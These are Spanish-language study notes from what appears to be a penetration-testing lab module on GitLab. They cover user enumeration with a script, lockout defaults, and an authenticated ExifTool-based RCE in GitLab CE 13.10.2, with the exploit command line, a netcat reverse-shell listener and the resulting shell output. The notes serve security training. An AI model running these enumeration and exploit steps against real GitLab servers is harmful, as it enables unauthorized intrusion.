
## 1. Enumeración de usuarios

GitLab permite enumerar usuarios mediante el formulario de registro o herramientas específicas. Esto puede servir para identificar cuentas válidas y comprobar, de forma controlada, si existen contraseñas débiles o credenciales reutilizadas.

### Script de enumeración

Ejecutar `gitlab_userenum.sh` contra la instancia objetivo:

```
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

En el ejemplo del módulo, se identifican dos usuarios válidos:

- `root`: administrador integrado.
    
- `bob`: usuario existente.
    

### Bloqueo de cuentas

Según el material, en versiones anteriores a GitLab 16.6, los valores predeterminados eran:

- **Intentos fallidos antes del bloqueo:** 10.
    
- **Tiempo de desbloqueo:** 10 minutos.
    

Configuración:

```
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```

Desde GitLab 16.6, los administradores pueden modificar estos valores desde la interfaz de administración.

**Importante:** una lista de usuarios válidos también puede servir para comprobar la reutilización de credenciales obtenidas mediante OSINT o filtraciones.

## 2. RCE autenticada — CVE de GitLab

### Versiones vulnerables

El material indica que **GitLab Community Edition 13.10.2 y versiones anteriores** eran vulnerables a una ejecución remota de código autenticada relacionada con el procesamiento de metadatos de imágenes mediante ExifTool.

- **Vulnerabilidad:** ejecución remota de código (RCE).
    
- **Autenticación:** necesaria.
    
- **Causa:** procesamiento de metadatos de imágenes subidas.
    
- **Versiones afectadas según el módulo:** GitLab CE 13.10.2 y anteriores.
    

Si la instancia permite el autorregistro, se puede crear una cuenta para realizar las pruebas sin necesitar previamente credenciales de otro usuario.

### Ejecución del exploit

Ejemplo del módulo:

```
python3 gitlab_13_10_2_rce.py \
  -t http://gitlab.inlanefreight.local:8081 \
  -u mrb3n \
  -p password1 \
  -c '<comando>'
```

Parámetros:

- `-t`: URL del objetivo.
    
- `-u`: nombre de usuario.
    
- `-p`: contraseña.
    
- `-c`: comando que se ejecutará en el servidor.
    

El ejemplo original utiliza una reverse shell hacia el puerto `8443`. Para probarlo en un laboratorio autorizado, configura la dirección IP y el puerto de escucha de acuerdo con tu entorno.

### Escucha de la conexión

En la máquina atacante:

```
nc -lnvp 8443
```

### Resultado del módulo

La conexión obtenida corresponde al usuario `git`:

```
id
```

Salida:

```
uid=996(git) gid=997(git) groups=997(git)
```

El ejemplo también muestra el directorio de trabajo:

```
git@app04:~/gitlab-workhorse$
```

Y los archivos presentes:

```
ls
```

Resultado:

```
VERSION
config.toml
flag_gitlab.txt
sockets
```

**Importante:** la RCE proporciona ejecución de comandos como `git`, pero no implica automáticamente privilegios de root.

## 3. Checklist de enumeración y explotación

1. Acceder a la instancia de GitLab.
    
2. Enumerar usuarios mediante el registro o `gitlab_userenum.sh`.
    
3. Comprobar si es posible registrarse y obtener una cuenta.
    
4. Identificar la versión de GitLab. Si es posible iniciar sesión, consultar `/help`.
    
5. Comprobar si la versión corresponde a GitLab CE 13.10.2 o anterior.
    
6. Si se cumplen las condiciones, probar la RCE autenticada en el laboratorio.
    
7. Recibir la conexión en el listener.
    
8. Ejecutar `id` y `ls` para comprobar el usuario y el entorno.
    

### URLs importantes

|Ruta|Función|
|---|---|
|`/users/sign_in`|Inicio de sesión|
|`/users/sign_up`|Registro y posible enumeración de usuarios|
|`/explore`|Exploración de proyectos públicos|
|`/help`|Consulta de versión tras iniciar sesión|
|`/admin/application_settings/general`|Configuración general y restricciones de registro|

**Nota:** las rutas anteriores pertenecen a la enumeración descrita en la sección previa del módulo.

## 4. Datos que debes recordar

- **Enumeración:** `gitlab_userenum.sh`.
    
- **Usuarios encontrados en el ejemplo:** `root` y `bob`.
    
- **Versión vulnerable indicada:** GitLab CE 13.10.2 y anteriores.
    
- **Tipo de vulnerabilidad:** RCE autenticada por el procesamiento de metadatos de imágenes con ExifTool.
    
- **Puerto de escucha del ejemplo:** `8443`.
    
- **Usuario de la shell obtenida:** `git`.
    
- **Archivo interesante encontrado:** `flag_gitlab.txt`.
    
- **Bloqueo predeterminado descrito:** 10 intentos fallidos y desbloqueo a los 10 minutos.
    

La clave es **enumerar primero los usuarios y la versión**. No conviene lanzar exploits a ciegas si no hay indicios de que la instancia sea vulnerable.
